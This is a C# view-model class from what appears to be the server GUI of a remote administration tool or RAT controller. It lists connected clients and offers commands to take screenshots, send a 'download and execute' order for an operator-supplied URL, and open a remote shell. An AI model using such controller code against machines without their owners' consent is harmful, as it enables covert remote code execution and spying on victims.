namespace GuiServer.ServerImplementation.ViewModel
{
 
    using GuiServer.ViewImplementation.Presenter;
    using GuiServer.ViewImplementation.Windows;
    using MarrySocket.MServer;
    using NetworkObjects;
    using System.ComponentModel;
    using System.Windows.Input;

    public class ClientViewModel : INotifyPropertyChanged
    {
        public event PropertyChangedEventHandler PropertyChanged;

        private int id;
        private ClientSocket clientSocket;
        private ComputerInfo computerInfo;
        private RemoteShellPresenter remoteShellPresenter;

        public ClientViewModel(ClientSocket clientSocket)
        {
            this.clientSocket = clientSocket;
            this.Id = clientSocket.Id;

            this.Init();
        }

        private void Init()
        {
            this.remoteShellPresenter = new RemoteShellPresenter(this);


            this.CmdDisconnect = new CommandHandler(() => this.Disconnect(), this.CanDisconnect());
            this.CmdScreenshot = new CommandHandler(() => this.Screenshot(), this.CanScreenshot());
            this.CmdDownloadExecute = new CommandHandler(() => this.DownloadExecute(), this.CanDownload());
            this.CmdRun = new CommandHandler(() => this.Run(), this.CanRun());
        
        }

        public int Id { get { return this.id; } set { this.id = value; NotifyPropertyChanged("Id"); } }
        public ComputerInfo ComputerInfo { get { return this.computerInfo; } set { this.computerInfo = value; NotifyPropertyChanged("ComputerInfo"); } }
        public string Ip { get { return this.clientSocket.Ip; } }
        public string FullName { get { return string.Format("{0}@{1}", this.id, this.Ip); } }

        public ICommand CmdDisconnect { get; set; }
        public ICommand CmdScreenshot { get; set; }
        public ICommand CmdDownloadExecute { get; set; }
        public ICommand CmdRun { get; set; }


        private bool CanDisconnect()
        {
            return true;
        }

        private void Disconnect()
        {
            this.clientSocket.Close();
        }

        private bool CanScreenshot()
        {
            return true;
        }

        private void Screenshot()
        {
            this.clientSocket.SendObject(PacketId.SCREEN_SHOT, 40L);
        }

        private bool CanDownload()
        {
            return true;
        }

        private void DownloadExecute()
        {
            string url = TextInputWindow.ShowWindow("Download and Execute", "URL to download:");
            if (!string.IsNullOrEmpty(url))
            {
                DownloadExec downloadExec = new DownloadExec(url);
                this.clientSocket.SendObject(PacketId.DOWNLOAD_AND_EXECUTE, downloadExec);
            }
        }

        private bool CanRun()
        {
            return !this.remoteShellPresenter.IsActive;
        }

        private void Run()
        {
            RemoteShellWindow remoteShellWindow = new RemoteShellWindow();
            this.remoteShellPresenter.SetRemoteShellWindow(remoteShellWindow);
            this.remoteShellPresenter.Show();
        }

        public void UpdateRemoteShellOutput(string output)
        {
            this.remoteShellPresenter.UpdateOutput(output);
        }

        public void SendObject(short packetId, object myClass)
        {
            this.clientSocket.SendObject(packetId, myClass);
        }

        public void NotifyPropertyChanged(string obj)
        {
            if (PropertyChanged != null)
            {
                this.PropertyChanged(this, new PropertyChangedEventArgs(obj));
            }
        }

    }
}
